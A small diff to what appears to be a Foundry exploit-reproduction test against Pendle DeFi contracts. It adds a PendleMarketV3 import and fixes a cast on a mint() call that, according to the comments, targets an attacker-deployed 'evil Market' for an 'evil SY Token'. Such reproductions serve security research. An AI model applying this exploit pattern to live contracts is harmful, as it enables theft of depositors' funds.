@@ -7,6 +7,7 @@ import "./Cheatsheet.sol";
 import "../src/interfaces/pendle/PendleYieldContractFactory.sol";
 import "../src/interfaces/pendle/PendleYieldToken.sol";
 import "../src/interfaces/pendle/PendleRouterV4.sol";
+import "../src/interfaces/pendle/PendleMarketV3.sol";
 import "../src/interfaces/pendle/PendleMarketRegisterHelper.sol";
 import "../src/interfaces/pendle/PendleMarketDepositHelper.sol";
 import "../src/interfaces/pendle/PendleStaking.sol";
@@ -108,7 +109,7 @@ contract AttackingContract is Test {
         // Call to 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82 (evil Market / LPT)
         // 0x156e29f6 is the selector for it's mint() method
         // Mints 1 evil Market's LPT for this evil SY Token contract
-        PendleMarketFactoryV3(LPT).mint(
+        PendleMarketV3(LPT).mint(
             address(this),
             1 ether,
             1 ether
